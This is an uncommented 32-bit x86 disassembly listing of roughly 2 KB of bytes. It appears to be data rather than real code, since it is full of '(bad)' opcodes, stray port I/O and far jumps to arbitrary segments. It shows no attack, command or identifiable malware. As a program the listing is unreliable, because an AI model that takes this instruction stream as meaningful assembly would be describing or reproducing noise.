  41b2b2:	out    dx,al
  41b2b3:	rcr    BYTE PTR [ecx+ebp*4],cl
  41b2b6:	mov    BYTE PTR [edx+0x38797f1a],ch
  41b2bc:	mov    dh,0xa2
  41b2be:	bound  esi,QWORD PTR [edx-0x3c]
  41b2c1:	jnp    0x41b26d
  41b2c3:	nop
  41b2c4:	fdivr  DWORD PTR [ebp+0x37]
  41b2c7:	push   edx
  41b2c8:	pop    esi
  41b2c9:	les    ebp,FWORD PTR ds:[esi+0x32]
  41b2cd:	es std 
  41b2cf:	(bad)  
  41b2d0:	js     0x41b2a7
  41b2d2:	iret   
  41b2d3:	push   ss
  41b2d4:	sti    
  41b2d5:	mov    gs,WORD PTR [ebx]
  41b2d7:	retf   0x753e
  41b2da:	test   DWORD PTR [eax],edx
  41b2dc:	xlat   BYTE PTR ds:[ebx]
  41b2dd:	into   
  41b2de:	(bad)  
  41b2df:	div    DWORD PTR [edx]
  41b2e1:	rcr    BYTE PTR [ebp-0x55df7896],cl
  41b2e7:	pop    ebp
  41b2e8:	mov    eax,0xbb10c22f
  41b2ed:	mov    dh,0x3
  41b2ef:	jb     0x41b350
  41b2f1:	xor    eax,0x73ba3394
  41b2f6:	lock leave 
  41b2f8:	or     cl,dh
  41b2fa:	add    al,0x89
  41b2fc:	fimul  DWORD PTR [ebx-0x7]
  41b2ff:	aas    
  41b300:	test   eax,0x44a3b410
  41b305:	shl    BYTE PTR [ebp-0x33129ac1],cl
  41b30b:	and    ebx,DWORD PTR [ebp+0x14]
  41b30e:	rol    BYTE PTR [ecx],cl
  41b310:	and    ebx,DWORD PTR [ecx]
  41b312:	sbb    edi,DWORD PTR [edx]
  41b314:	jns    0x41b376
  41b316:	loop   0x41b30e
  41b318:	retf   
  41b319:	shr    DWORD PTR [edx+0x73],0xa6
  41b31d:	cld    
  41b31e:	les    ecx,FWORD PTR [edx-0x5]
  41b321:	dec    eax
  41b322:	lods   al,BYTE PTR ds:[esi]
  41b323:	jo     0x41b2df
  41b325:	repz cmc 
  41b327:	push   0x24
  41b329:	sbb    dl,al
  41b32b:	int    0xe5
  41b32d:	dec    ebp
  41b32e:	repnz sbb al,0x49
  41b331:	icebp  
  41b332:	mov    eax,0x18532da4
  41b337:	sar    DWORD PTR [ebp+edi*2+0x4e],0xd2
  41b33c:	jno    0x41b2d8
  41b33e:	jecxz  0x41b2f0
  41b340:	outs   dx,BYTE PTR ds:[esi]
  41b341:	shl    eax,0xd
  41b344:	push   ds
  41b345:	repnz in al,0xf5
  41b348:	mov    esp,0xe4df6e89
  41b34d:	outs   dx,BYTE PTR ds:[esi]
  41b34e:	test   al,0x9a
  41b350:	adc    al,0xe4
  41b352:	shr    DWORD PTR [ecx+0x3f],cl
  41b355:	js     0x41b354
  41b357:	ins    BYTE PTR es:[edi],dx
  41b358:	retf   
  41b359:	arpl   di,dx
  41b35b:	cdq    
  41b35c:	jp     0x41b306
  41b35e:	xchg   esp,eax
  41b35f:	xor    BYTE PTR [ebp+ebp*2-0x1a385b80],dl
  41b366:	xor    BYTE PTR [ecx-0x78],0x32
  41b36a:	mov    edi,0xa58a3a33
  41b36f:	push   0xfc3de105
  41b374:	out    dx,al
  41b375:	xlat   BYTE PTR ds:[ebx]
  41b376:	or     eax,0x70c7c82f
  41b37b:	add    BYTE PTR [edx],dl
  41b37d:	mov    ebp,0xcbe3be4b
  41b382:	icebp  
  41b383:	jg     0x41b324
  41b385:	fwait
  41b386:	fwait
  41b387:	jno    0x41b39d
  41b389:	sbb    esi,DWORD PTR [esi]
  41b38b:	imul   edi,esi,0x8b3e564e
  41b391:	imul   edi,ebx,0xcbbc554c
  41b397:	lahf   
  41b398:	xlat   BYTE PTR ds:[ebx]
  41b399:	cmc    
  41b39a:	lahf   
  41b39b:	push   0x1
  41b39d:	mov    bl,0x42
  41b39f:	inc    esp
  41b3a0:	sbb    cl,BYTE PTR ds:0xa88d9897
  41b3a6:	xchg   edx,eax
  41b3a7:	xor    eax,0x3247636a
  41b3ac:	push   0xffffffdc
  41b3ae:	push   ds
  41b3af:	push   eax
  41b3b0:	mov    ah,0x27
  41b3b2:	xchg   esp,eax
  41b3b3:	ror    DWORD PTR [ebx-0xc319f37],0x58
  41b3ba:	inc    edx
  41b3bb:	loop   0x41b3b8
  41b3bd:	test   DWORD PTR [edx],esp
  41b3bf:	nop
  41b3c0:	sbb    al,0x87
  41b3c2:	add    DWORD PTR [ebx+0x3b],ebp
  41b3c5:	data16 mov ch,0xd5
  41b3c8:	and    BYTE PTR [ebx-0x2712b64f],ch
  41b3ce:	jle    0x41b408
  41b3d0:	mov    esi,0x5f5e0d3a
  41b3d5:	mov    WORD PTR [edx],ax
  41b3d8:	sti    
  41b3d9:	or     DWORD PTR [esi+0x3e],edi
  41b3dc:	pop    eax
  41b3dd:	int    0xf8
  41b3df:	push   edi
  41b3e0:	ror    BYTE PTR [esi+0x3c],0x4c
  41b3e4:	out    dx,al
  41b3e5:	sahf   
  41b3e6:	push   es
  41b3e7:	jmp    0x10a6:0xe7b765cf
  41b3ee:	loope  0x41b42b
  41b3f0:	dec    ebx
  41b3f1:	adc    bl,ah
  41b3f3:	repnz push ss
  41b3f5:	jp     0x41b3b1
  41b3f7:	icebp  
  41b3f8:	out    0x7e,al
  41b3fa:	icebp  
  41b3fb:	push   es
  41b3fc:	xor    DWORD PTR [eax-0xb],edx
  41b3ff:	push   0xf46da06
  41b404:	push   ebx
  41b405:	push   0x2b
  41b407:	aaa    
  41b408:	fs retf 
  41b40a:	dec    ebx
  41b40b:	sahf   
  41b40c:	or     BYTE PTR [edx],al
  41b40e:	push   eax
  41b40f:	fsubr  QWORD PTR [eax]
  41b411:	jmp    0x7a36:0x89bdd20b
  41b418:	retf   0x3938
  41b41b:	sbb    BYTE PTR [ecx+0x576ae0bb],dl
  41b421:	jo     0x41b45c
  41b423:	clc    
  41b424:	xor    DWORD PTR [edx],0xffffff89
  41b427:	call   0x6158:0x4e377161
  41b42e:	lea    ebp,[edi]
  41b430:	pop    es
  41b431:	cmp    dl,bh
  41b433:	loopne 0x41b43d
  41b435:	adc    DWORD PTR [edi+0x1a1f9e79],esp
  41b43b:	int3   
  41b43c:	mov    al,0x56
  41b43e:	retf   
  41b43f:	inc    esi
  41b440:	cmp    esp,esi
  41b442:	loop   0x41b3e7
  41b444:	add    al,0xb0
  41b446:	(bad)  
  41b447:	push   edi
  41b448:	popa   
  41b449:	sahf   
  41b44a:	arpl   di,si
  41b44c:	(bad)  
  41b44d:	out    dx,al
  41b44e:	mov    bh,0x86
  41b450:	inc    eax
  41b451:	fnop   
  41b453:	add    BYTE PTR ss:[eax+0x6cf13727],cl
  41b45a:	cmp    bh,BYTE PTR [ebp-0x66c697df]
  41b460:	pop    eax
  41b461:	dec    ebp
  41b462:	mov    db2,esp
  41b465:	and    BYTE PTR [ebx+0x29],0x9d
  41b469:	mov    ch,0xca
  41b46b:	in     eax,0xb7
  41b46d:	mov    ebp,0x2852f889
  41b472:	hlt    
  41b473:	inc    ecx
  41b474:	cmp    al,0x41
  41b476:	int3   
  41b477:	adc    al,0xf2
  41b479:	push   ebx
  41b47a:	popf   
  41b47b:	fdiv   QWORD PTR [esi]
  41b47d:	dec    esi
  41b47e:	mov    dl,0x5e
  41b480:	jp     0x41b439
  41b482:	sbb    bl,BYTE PTR [esi-0x28]
  41b485:	jp     0x41b42f
  41b487:	sub    eax,0xf5f434ce
  41b48c:	mov    ebx,0x8d91db8b
  41b491:	cdq    
  41b492:	xor    eax,0xebc4e428
  41b497:	push   0x16
  41b499:	stos   BYTE PTR es:[edi],al
  41b49a:	inc    edx
  41b49b:	cmc    
  41b49c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b49d:	iret   
  41b49e:	or     BYTE PTR [esi],bh
  41b4a0:	adc    DWORD PTR [edx],0x5b7201ff
  41b4a6:	cs mov bl,0xf0
  41b4a9:	sub    bh,BYTE PTR [edx+0x38187014]
  41b4af:	or     ebx,edx
  41b4b1:	sub    BYTE PTR [ebx],al
  41b4b3:	sbb    DWORD PTR [esp+eiz*8],edi
  41b4b6:	xchg   BYTE PTR [esp+eax*2],bh
  41b4b9:	cmc    
  41b4ba:	sub    ah,ch
  41b4bc:	mov    eax,0xa647203b
  41b4c1:	xchg   ebx,eax
  41b4c2:	mov    esi,0xeaa5bccc
  41b4c7:	popa   
  41b4c8:	sub    al,0x39
  41b4ca:	mov    ebp,0x1094922c
  41b4cf:	dec    eax
  41b4d0:	sti    
  41b4d1:	adc    dx,WORD PTR [esi+edi*8+0x66]
  41b4d6:	bound  esp,QWORD PTR [eax+0x47fd2bb3]
  41b4dc:	fninit 
  41b4de:	add    eax,0xdc743d9f
  41b4e3:	out    dx,eax
  41b4e4:	cld    
  41b4e5:	jmp    0x41b522
  41b4e7:	ror    BYTE PTR [eax],cl
  41b4e9:	ds std 
  41b4eb:	and    DWORD PTR [esp],edx
  41b4ee:	or     eax,0xdae78f41
  41b4f3:	pop    ebx
  41b4f4:	add    bl,dl
  41b4f6:	sti    
  41b4f7:	rol    DWORD PTR [edx+0x4],cl
  41b4fa:	sub    eax,0x22e0ca98
  41b4ff:	sbb    bl,BYTE PTR [esp+edi*1]
  41b502:	and    eax,edx
  41b504:	sahf   
  41b505:	and    DWORD PTR [ecx],ecx
  41b507:	jge    0x41b4b6
  41b509:	in     al,dx
  41b50a:	and    bh,ah
  41b50c:	test   DWORD PTR [edi-0x5b],ecx
  41b50f:	sub    DWORD PTR [ebx+ebp*2-0x7f],0x5
  41b514:	mov    eax,0x665ba62d
  41b519:	sbb    eax,0x227e4d78
  41b51e:	sbb    al,0xf8
  41b520:	lahf   
  41b521:	call   0x4b25:0x230b5aac
  41b528:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b529:	(bad)  
  41b52a:	mov    bl,0x68
  41b52c:	loopne 0x41b513
  41b52e:	or     ecx,DWORD PTR [esp+ebp*4+0x4e]
  41b532:	cmp    BYTE PTR [ecx+0x6],dh
  41b535:	sub    dh,BYTE PTR [edx]
  41b537:	jb     0x41b4f5
  41b539:	or     DWORD PTR [esp+eax*4+0x212da80c],ebp
  41b540:	ss xchg edx,eax
  41b542:	es rcl DWORD PTR gs:[ebx],1
  41b546:	and    al,0x1c
  41b548:	inc    edi
  41b549:	lds    ebx,FWORD PTR [esp+edi*2]
  41b54c:	scas   al,BYTE PTR es:[edi]
  41b54d:	frstor [esi-0x3ff4b22c]
  41b553:	pop    ds
  41b554:	or     esp,eax
  41b556:	push   0x5ed60572
  41b55b:	mov    bh,0x30
  41b55d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b55e:	mov    ah,0xf9
  41b560:	out    dx,al
  41b561:	js     0x41b5e1
  41b563:	fnstsw WORD PTR cs:[ecx-0x58]
  41b567:	sub    al,0xee
  41b569:	les    esp,FWORD PTR [ecx]
  41b56b:	mov    ch,0x52
  41b56d:	mov    WORD PTR [eax+0x7db3909b],ds
  41b573:	pop    esp
  41b574:	aas    
  41b575:	nop
  41b576:	mov    ecx,0x838cffe7
  41b57b:	sub    al,0xfb
  41b57d:	test   ecx,ebx
  41b57f:	sbb    cl,al
  41b581:	test   ecx,esi
  41b583:	sub    eax,0xfe02fbf0
  41b588:	outs   dx,DWORD PTR ds:[esi]
  41b589:	push   ebp
  41b58a:	push   ebp
  41b58b:	push   edi
  41b58c:	popa   
  41b58d:	mov    WORD PTR [ecx*8+0x27dbf9ff],gs
  41b594:	sar    BYTE PTR es:[ecx],1
  41b597:	mov    esi,0x879c25d6
  41b59c:	daa    
  41b59d:	mov    ebx,0x5e843073
  41b5a2:	or     DWORD PTR [edi-0x75],eax
  41b5a5:	enter  0x8499,0x7d
  41b5a9:	shl    DWORD PTR [edx-0x34cf4e92],1
  41b5af:	xchg   esi,eax
  41b5b0:	pop    es
  41b5b1:	sbb    BYTE PTR [esi],cl
  41b5b3:	popf   
  41b5b4:	add    eax,0xbe505a35
  41b5b9:	sub    bh,cl
  41b5bb:	mov    esi,0xade7856b
  41b5c0:	mov    ds:0x8a0acd21,al
  41b5c5:	mov    ecx,0x749453d0
  41b5ca:	aad    0xf6
  41b5cc:	or     BYTE PTR [eax],al
  41b5ce:	or     edx,esp
  41b5d0:	retf   
  41b5d1:	sub    DWORD PTR [ebx+0xc191f48],esi
  41b5d7:	xor    al,0xa4
  41b5d9:	jle    0x41b5d4
  41b5db:	jg     0x41b659
  41b5dd:	mov    edi,0xa8b14c45
  41b5e2:	fcom   DWORD PTR [ecx]
  41b5e4:	add    edx,edi
  41b5e6:	push   0x4b6d2645
  41b5eb:	jo     0x41b5e2
  41b5ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5ee:	inc    edi
  41b5ef:	enter  0x9df0,0xe2
  41b5f3:	les    edi,FWORD PTR [edx]
  41b5f5:	clc    
  41b5f6:	fmul   QWORD PTR [ecx+eiz*2-0x209af9c2]
  41b5fd:	push   es
  41b5fe:	outs   dx,BYTE PTR ds:[esi]
  41b5ff:	and    eax,0xd50eeda
  41b604:	cli    
  41b605:	ret    
  41b606:	(bad)  
  41b607:	pop    ecx
  41b608:	xor    cl,BYTE PTR [ebx+0x5]
  41b60b:	test   DWORD PTR [eax-0x2b401834],edi
  41b611:	mov    ecx,0x8a336f1e
  41b616:	and    dl,BYTE PTR [esi-0x31ab8d12]
  41b61c:	scas   al,BYTE PTR es:[edi]
  41b61d:	cmp    al,0xfc
  41b61f:	jmp    0x14b9cc27
  41b624:	mov    edx,0xc6dd4606
  41b629:	inc    BYTE PTR [esi+0x63]
  41b62c:	mov    ebp,0xc8d31a89
  41b631:	rol    BYTE PTR [ecx],1
  41b633:	inc    edi
  41b634:	mov    bh,0x5b
  41b636:	(bad)  
  41b637:	scas   eax,DWORD PTR es:[edi]
  41b638:	cmp    DWORD PTR [edx],edi
  41b63a:	in     eax,0x56
  41b63c:	lock sbb al,0xe3
  41b63f:	push   eax
  41b640:	add    ebx,edx
  41b642:	sbb    al,0x26
  41b644:	xor    dh,bh
  41b646:	dec    edx
  41b647:	out    dx,eax
  41b648:	mov    DWORD PTR [ebx],ebx
  41b64a:	sbb    eax,0xd773f2fe
  41b64f:	xchg   ebp,eax
  41b650:	mov    cl,0xf1
  41b652:	pop    edx
  41b653:	dec    edx
  41b654:	cmp    esi,DWORD PTR [eax-0x59]
  41b657:	dec    edx
  41b658:	lods   al,BYTE PTR ds:[esi]
  41b659:	mov    WORD PTR [edx],es
  41b65b:	fsubr  DWORD PTR [esi+0x78e02aff]
  41b661:	mov    eax,0x626c783c
  41b666:	daa    
  41b667:	aad    0xca
  41b669:	into   
  41b66a:	imul   esp,DWORD PTR [edi+0x7],0x3970fb40
  41b671:	mov    al,0xfe
  41b673:	mov    BYTE PTR [ebx],ah
  41b675:	dec    eax
  41b676:	inc    BYTE PTR [ebp+0x65]
  41b679:	mov    eax,gs
  41b67b:	dec    ecx
  41b67c:	sub    ebp,DWORD PTR [ebx+0x4718bbe0]
  41b682:	mov    eax,0xaf885e50
  41b687:	lods   al,BYTE PTR ds:[esi]
  41b688:	fisttp DWORD PTR [esi-0x19]
  41b68b:	daa    
  41b68c:	mov    esp,DWORD PTR [edx-0x49a98567]
  41b692:	sbb    eax,0x403955b5
  41b697:	mov    dh,0x85
  41b699:	retf   0x3768
  41b69c:	add    cl,bl
  41b69e:	adc    ecx,DWORD PTR [ebp+0x72d352a]
  41b6a4:	sub    eax,0x1adaaf6c
  41b6a9:	mov    ah,0x2b
  41b6ab:	cwde   
  41b6ac:	cmp    eax,0x56fe9f93
  41b6b1:	sbb    eax,0x431d1342
  41b6b6:	mov    WORD PTR [edi+0x7016ca65],?
  41b6bc:	retf   
  41b6bd:	jb     0x41b6b1
  41b6bf:	pop    ebx
  41b6c0:	fistp  WORD PTR [edx+eax*4]
  41b6c3:	in     eax,0xed
  41b6c5:	stc    
  41b6c6:	add    DWORD PTR [ecx+0x47],esp
  41b6c9:	(bad)  
  41b6ca:	push   ebp
  41b6cb:	push   esi
  41b6cc:	enter  0x49ce,0xf1
  41b6d0:	xor    eax,0x93e1b40a
  41b6d5:	dec    ecx
  41b6d6:	loopne 0x41b661
  41b6d8:	fdiv   st(7),st
  41b6da:	dec    ebx
  41b6db:	adc    dh,BYTE PTR [eax]
  41b6dd:	scas   eax,DWORD PTR es:[edi]
  41b6de:	sbb    eax,0xf3a453e2
  41b6e3:	ret    
  41b6e4:	fldenv [eax]
  41b6e6:	clc    
  41b6e7:	scas   al,BYTE PTR es:[edi]
  41b6e8:	sbb    BYTE PTR [eax+esi*4+0x3752b134],ch
  41b6ef:	pop    ebx
  41b6f0:	xor    BYTE PTR [eax+0x3fa0fec1],cl
  41b6f6:	mov    eax,ds:0x49f16ef1
  41b6fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b6fc:	dec    esi
  41b6fd:	aad    0xef
  41b6ff:	mov    al,ds:0x9fa2ec7d
  41b704:	cmp    ch,BYTE PTR [eax*4+0x42809c13]
  41b70b:	jmp    FWORD PTR [edi+0x6bc66a93]
  41b711:	mov    ds:0xbd4977f5,al
  41b716:	(bad)  
  41b717:	ja     0x41b6b3
  41b719:	stos   DWORD PTR es:[edi],eax
  41b71a:	jmp    0x2c63:0x3ec0b2aa
  41b721:	jmp    0x89a4:0x6e7c38c8
  41b728:	sbb    dh,BYTE PTR [edx+edx*1-0x20b4e51f]
  41b72f:	outs   dx,BYTE PTR ds:[esi]
  41b730:	nop
  41b731:	(bad)  
  41b732:	dec    edi
  41b733:	push   cs
  41b734:	add    BYTE PTR [edx],bl
  41b736:	xor    ebp,DWORD PTR [edx-0x67b97c46]
  41b73c:	dec    ecx
  41b73d:	call   0x3412:0x276a8f0f
  41b744:	mov    ecx,0xa5f47d4
  41b749:	sub    edi,esp
  41b74b:	add    ebx,DWORD PTR [ebx+0x4c]
  41b74e:	add    eax,esp
  41b750:	cmp    ecx,esi
  41b752:	mov    bh,0x46
  41b754:	sbb    al,0x8c
  41b756:	ret    
  41b757:	cmp    BYTE PTR [esi+eiz*8],al
  41b75a:	add    bh,al
  41b75c:	mov    eax,0x364707e4
  41b761:	cmp    edi,esi
  41b763:	cli    
  41b764:	shl    DWORD PTR [ebx+0x139f6d1b],cl
  41b76a:	(bad)  
  41b76c:	jne    0x41b79c
  41b76e:	gs cmp eax,0x2270ed9b
  41b774:	pop    ebx
  41b775:	dec    eax
  41b776:	jno    0x41b742
  41b778:	and    eax,0x7b3cc14f
  41b77d:	adc    ah,BYTE PTR [eax+0x31]
  41b780:	and    al,0x3b
  41b782:	pop    ebx
  41b783:	mov    ch,0x89
  41b785:	out    0x40,al
  41b787:	popa   
  41b788:	jl     0x41b7e6
  41b78a:	stc    
  41b78b:	(bad)  
  41b78c:	push   ds
  41b78d:	pop    es
  41b78e:	icebp  
  41b78f:	rcl    ecx,cl
  41b791:	pop    ebx
  41b792:	dec    ebx
  41b793:	lahf   
  41b794:	mov    WORD PTR [ecx+0x292081f],cs
  41b79a:	pop    ebx
  41b79b:	sub    al,0xd9
  41b79d:	lods   al,BYTE PTR ds:[esi]
  41b79e:	adc    al,0x4a
  41b7a0:	outs   dx,BYTE PTR ds:[esi]
  41b7a1:	cmp    eax,0x4289d34e
  41b7a6:	shl    DWORD PTR [ecx-0x55987dc],0x5a
  41b7ad:	data16 jge 0x41b7c6
  41b7b0:	adc    eax,0xffb665ae
  41b7b5:	into   
  41b7b6:	dec    esi
  41b7b7:	lahf   
  41b7b8:	cs sbb eax,0x456c8a86
  41b7be:	mov    dl,0xc4
  41b7c0:	cdq    
  41b7c1:	cmp    bh,0xfd
  41b7c4:	pop    edx
  41b7c5:	push   eax
  41b7c6:	lea    ecx,[edi+0x7a]
  41b7c9:	jnp    0x41b847
  41b7cb:	div    DWORD PTR [esi]
  41b7cd:	jmp    0x41b819
  41b7cf:	outs   dx,BYTE PTR ds:[esi]
  41b7d0:	nop
  41b7d1:	mov    ah,0x65
  41b7d3:	mov    al,ds:0xc1253418
  41b7d8:	sbb    BYTE PTR [ebx],dl
  41b7da:	or     eax,0x29a2c09a
  41b7df:	and    al,0x33
  41b7e1:	lods   eax,DWORD PTR ds:[esi]
  41b7e2:	mov    edx,?
  41b7e4:	push   esp
  41b7e5:	dec    esp
  41b7e6:	push   es
  41b7e7:	pop    ss
  41b7e8:	cwde   
  41b7e9:	push   esp
  41b7ea:	js     0x41b789
  41b7ec:	pop    es
  41b7ed:	leave  
  41b7ee:	dec    edx
  41b7ef:	pop    ecx
  41b7f0:	popa   
  41b7f1:	or     BYTE PTR [ebp+0x6575359a],0xe7
  41b7f8:	push   cs
  41b7f9:	adc    BYTE PTR [esi+0x30727391],bh
  41b7ff:	fdivr  QWORD PTR ds:0xac1f0384
  41b805:	addr16 nop
  41b807:	mov    DWORD PTR ds:0xfb074d23,edi
  41b80d:	mov    eax,cs
  41b80f:	sub    BYTE PTR [ebx-0x15],bl
  41b812:	call   0x6e9802ab
  41b817:	pop    ds
  41b818:	xchg   edi,eax
  41b819:	ret    
  41b81a:	and    eax,0x1ad133a6
  41b81f:	pop    esi
  41b820:	jmp    0x41b896
  41b822:	sbb    bl,BYTE PTR [edx]
  41b824:	aam    0x4b
  41b826:	push   0xf9f0b402
  41b82b:	ds xchg edx,eax
  41b82d:	cld    
  41b82e:	int3   
  41b82f:	scas   eax,DWORD PTR es:[edi]
  41b830:	xchg   esp,ebp
  41b832:	int    0x44
  41b834:	repnz cmp eax,0xbc6c6f26
  41b83a:	and    BYTE PTR [esi+esi*2],dl
  41b83d:	loopne 0x41b83e
  41b83f:	and    eax,0x35fe0332
  41b844:	xchg   esp,eax
  41b845:	pop    ss
  41b846:	mov    dh,ah
  41b848:	push   ebx
  41b849:	shl    BYTE PTR [ebp-0x57],cl
  41b84c:	dec    ecx
  41b84d:	sbb    al,0x5e
  41b84f:	pop    ss
  41b850:	mov    BYTE PTR [ecx-0x4b],bh
  41b853:	aam    0x51
  41b855:	adc    edx,DWORD PTR ds:0xf92aa620
  41b85b:	jnp    0x41b8da
  41b85d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b85e:	loopne 0x41b8c1
  41b860:	push   ebx
  41b861:	pusha  
  41b862:	int3   
  41b863:	inc    ecx
  41b864:	inc    edx
  41b865:	cmp    DWORD PTR [edi],edi
  41b867:	or     DWORD PTR [ebp+0x39],eax
  41b86a:	inc    esi
  41b86b:	mov    edx,0x237c6cc0
  41b870:	cmp    al,0x73
  41b872:	loop   0x41b849
  41b874:	icebp  
  41b875:	add    al,al
  41b877:	xor    al,0xf4
  41b879:	inc    ebp
  41b87a:	jg     0x41b826
  41b87c:	imul   eax,DWORD PTR [ebx-0x3],0xffffffa9
  41b880:	out    dx,al
  41b881:	mov    eax,0xb62ea5cd
  41b886:	cmp    eax,DWORD PTR ds:0xf64cf2ce
  41b88c:	femms  
  41b88e:	push   esp
  41b890:	ficom  DWORD PTR [edi]
  41b892:	(bad)  
  41b893:	ins    BYTE PTR es:[edi],dx
  41b894:	ja     0x41b8b6
  41b896:	ins    BYTE PTR es:[edi],dx
  41b897:	out    dx,al
  41b898:	mov    ds:0x9ca40c90,eax
  41b89d:	fld    QWORD PTR [ecx+0x14]
  41b8a0:	cmp    DWORD PTR [ecx],esp
  41b8a2:	mov    ecx,0x27d77e56
  41b8a7:	pop    es
  41b8a8:	scas   eax,DWORD PTR es:[edi]
  41b8a9:	stos   BYTE PTR es:[edi],al
  41b8aa:	add    DWORD PTR [ebx+0x27f3e304],esp
  41b8b0:	ja     0x41b869
  41b8b2:	jp     0x41b8a0
  41b8b4:	mov    ebx,0x4d5ba072
  41b8b9:	jb     0x41b933
  41b8bb:	mov    eax,ds:0x206b271e
  41b8c0:	dec    ecx
  41b8c1:	push   edi
  41b8c2:	mov    edi,0x5559c009
  41b8c7:	cdq    
  41b8c8:	push   eax
  41b8c9:	pop    esp
  41b8ca:	sti    
  41b8cb:	ret    
  41b8cc:	enter  0x3cd6,0x83
  41b8d0:	lods   eax,DWORD PTR ds:[esi]
  41b8d1:	jno    0x41b864
  41b8d3:	adc    DWORD PTR [edi+0x85bec4b],0x1e082e18
  41b8dd:	push   0x65
  41b8df:	loopne 0x41b86b
  41b8e1:	jmp    0x41b87a
  41b8e3:	sahf   
  41b8e4:	repnz push ebp
  41b8e6:	sub    esi,DWORD PTR [ebx+0x8979539]
  41b8ec:	and    edx,eax
  41b8ee:	pushf  
  41b8ef:	or     al,BYTE PTR [eax-0x6887a08b]
  41b8f5:	(bad)  
  41b8f6:	js     0x41b8ae
  41b8f8:	jb     0x41b8cb
  41b8fa:	mov    ds:0xce7b2c1f,al
  41b8ff:	test   ah,cl
  41b901:	daa    
  41b902:	mov    bl,0x7b
  41b904:	daa    
  41b905:	xchg   BYTE PTR [ebx+0x61],cl
  41b908:	clc    
  41b909:	adc    edx,DWORD PTR ds:0x4dae019c
  41b90f:	sti    
  41b910:	mov    cl,0xf1
  41b912:	and    DWORD PTR [ecx+edi*4+0x31],ebp
  41b916:	enter  0xa0da,0x8c
  41b91a:	and    DWORD PTR [ebx+0x5ce53d42],eax
  41b920:	fiadd  DWORD PTR [edx*1+0xfff69ae]
  41b927:	lea    esi,[ebx+0x2711daff]
  41b92d:	(bad)  
  41b92f:	mov    eax,ds:0x8a4d58b3
  41b934:	cld    
  41b935:	test   eax,0x26d99c9d
  41b93a:	sbb    dh,BYTE PTR [eax+eax*8+0x76]
  41b93e:	jg     0x41b911
  41b940:	add    al,0x3e
  41b942:	cmp    al,0x17
  41b944:	jmp    0x2578252e
  41b949:	out    0x5,eax
  41b94b:	mov    bh,0xc4
  41b94d:	sbb    eax,0xfa5a7647
  41b952:	cmc    
  41b953:	push   esp
  41b954:	push   ds
  41b955:	stos   BYTE PTR es:[edi],al
  41b956:	lods   al,BYTE PTR ds:[esi]
  41b957:	push   edi
  41b958:	mov    dh,0x9d
  41b95a:	push   es
  41b95b:	jbe    0x41b9c4
  41b95d:	add    ebp,ecx
  41b95f:	dec    ebx
  41b960:	das    
  41b961:	xor    al,bl
  41b963:	popf   
  41b964:	add    esp,DWORD PTR [ebx]
  41b966:	xor    bl,BYTE PTR [ebx+0x1f]
  41b969:	cmp    DWORD PTR [eax+0x24b837cc],eax
  41b96f:	mov    bl,0x13
  41b971:	enter  0xb4af,0x97
  41b975:	test   eax,0x17889560
  41b97a:	loop   0x41b937
  41b97c:	outs   dx,BYTE PTR ds:[esi]
  41b97d:	pop    ds
  41b97e:	and    al,0x54
  41b980:	dec    esp
  41b981:	xlat   BYTE PTR ds:[ebx]
  41b982:	adc    eax,0xe162c7a8
  41b987:	and    BYTE PTR [edi-0x4b629e51],dh
  41b98d:	xor    esp,DWORD PTR [eax-0x80]
  41b990:	std    
  41b991:	add    BYTE PTR [eax+edi*4],al
  41b994:	in     al,dx
  41b995:	gs inc ebp
  41b997:	mov    edx,0x1b2471d
  41b99c:	jge    0x41b959
  41b99e:	retf   
  41b99f:	test   BYTE PTR [ebp+0x57],bl
  41b9a2:	std    
  41b9a3:	or     al,0xc1
  41b9a5:	aas    
  41b9a6:	mov    ah,0x1f
  41b9a8:	rcl    BYTE PTR [edx+0x23],cl
  41b9ab:	popa   
  41b9ac:	mov    cl,0x9a
  41b9ae:	or     BYTE PTR [ebx-0x4ffbf5ad],cl
  41b9b4:	mov    DWORD PTR ds:0xcc6b5577,ecx
  41b9ba:	div    DWORD PTR [ecx+ebp*4]
  41b9bd:	imul   ebp,esi,0x21
  41b9c0:	int3   
  41b9c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b9c2:	adc    BYTE PTR [edx-0x55],0x20
  41b9c6:	mov    bh,0x8b
  41b9c8:	aaa    
  41b9c9:	jne    0x41b9b9
  41b9cb:	and    al,0x78
  41b9cd:	ret    
  41b9ce:	sbb    eax,0x84abcfd2
  41b9d3:	out    dx,eax
  41b9d4:	fsub   DWORD PTR [esi-0x213338e7]
  41b9da:	dec    ecx
  41b9db:	loop   0x41ba39
  41b9dd:	(bad)  
  41b9de:	cwde   
  41b9df:	rol    BYTE PTR [ebx+0x457ec967],1
  41b9e5:	mov    bl,0xe3
  41b9e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9e8:	pop    esp
  41b9e9:	inc    eax
  41b9ea:	add    edx,DWORD PTR [ecx+0x71]
  41b9ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9ee:	and    eax,0x39e39ba9
  41b9f3:	mov    ss,WORD PTR [ebx-0x7f]
  41b9f6:	push   DWORD PTR [ebp+0x647c86ad]
  41b9fc:	mov    ebp,0xaafdb09b
  41ba01:	sbb    BYTE PTR [ecx-0x2812f15f],cl
  41ba07:	inc    eax
  41ba08:	sar    dh,0xfa
  41ba0b:	jl     0x41ba05
  41ba0d:	xchg   ebx,eax
  41ba0e:	jno    0x41ba4c
  41ba10:	xchg   esi,eax
  41ba11:	sahf   
  41ba12:	out    dx,eax
  41ba13:	xchg   ebx,eax
  41ba14:	gs (bad) 
  41ba16:	cmp    ah,dl
  41ba18:	(bad)  
  41ba19:	(bad)  
  41ba1a:	int3   
  41ba1b:	jp     0x41b9ae
  41ba1d:	cmp    eax,0x39d2db88
  41ba22:	pop    ss
  41ba23:	sti    
  41ba24:	push   0x12
  41ba26:	add    BYTE PTR [edi+0x1d7cc9f4],cl
  41ba2c:	test   DWORD PTR [ebp+0x2e],ebp
  41ba2f:	mov    ecx,0xa9ff0b1
  41ba34:	and    cl,BYTE PTR [esi+0x1d]
  41ba37:	cld    
  41ba38:	ss push ss
  41ba3a:	fdivp  st(4),st
  41ba3c:	mov    al,0x12
  41ba3e:	es into 
